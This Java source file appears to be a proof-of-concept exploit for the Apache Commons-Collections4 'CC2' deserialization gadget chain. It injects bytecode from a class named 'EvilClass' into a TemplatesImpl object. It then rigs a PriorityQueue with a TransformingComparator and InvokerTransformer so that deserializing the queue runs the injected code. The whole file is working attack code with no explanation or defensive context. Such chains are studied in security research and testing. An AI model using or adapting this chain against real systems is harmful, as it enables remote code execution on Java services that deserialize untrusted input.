import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.util.PriorityQueue;

public class PriorityQueueCC2 {
    public static void main(String[] args) throws Exception{

        byte[] payload = Util.getExpClassFileBytes("EvilClass");

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", payload);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("getClass", null, null);

        PriorityQueue queue = new PriorityQueue();
        queue.add(1);
        queue.add(2);

        Object[] queue1 = (Object[]) Util.getObjectFieldValue(queue, "queue");
        queue1[0] = templates;

        TransformingComparator comparator = new TransformingComparator(invokerTransformer);

        Util.setValue(queue, "comparator", comparator);

        Util.setValue(invokerTransformer, "iMethodName", "newTransformer");


        byte[] bytes = Util.toSerial(queue);
        Util.fromSerial(bytes).readObject();
    }
}
